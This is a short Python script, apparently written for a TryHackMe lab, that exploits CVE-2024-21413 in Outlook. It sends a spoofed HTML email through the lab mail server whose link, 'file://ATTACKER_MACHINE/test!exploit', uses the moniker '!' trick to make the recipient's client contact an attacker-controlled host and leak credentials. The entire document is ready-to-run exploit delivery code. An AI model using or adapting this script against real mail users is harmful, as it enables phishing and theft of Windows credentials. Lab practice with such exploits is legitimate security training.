import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

# Set attacker and victim emails
sender_email = 'attacker@monikerlink.thm'  # Provided attacker email
receiver_email = 'victim@monikerlink.thm'  # Victim's email
password = "attacker"  # Password provided in the TryHackMe room

# Email content with exploit link
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
</html>"""

# Construct email
message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

msgHtml = MIMEText(html_content, 'html')
message.attach(msgHtml)

try:
    # Connect to the provided SMTP server
    smtp_server = "smtp.monikerlink.thm"  # Replace with actual SMTP server from the room
    server = smtplib.SMTP(smtp_server, 25)  # TryHackMe SMTP uses port 25

    server.ehlo()
    server.login(sender_email, password)  # Authenticate using provided credentials

    # Send email
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email successfully delivered!")

except Exception as error:
    print(f" Error: {error}")

finally:
    server.quit()

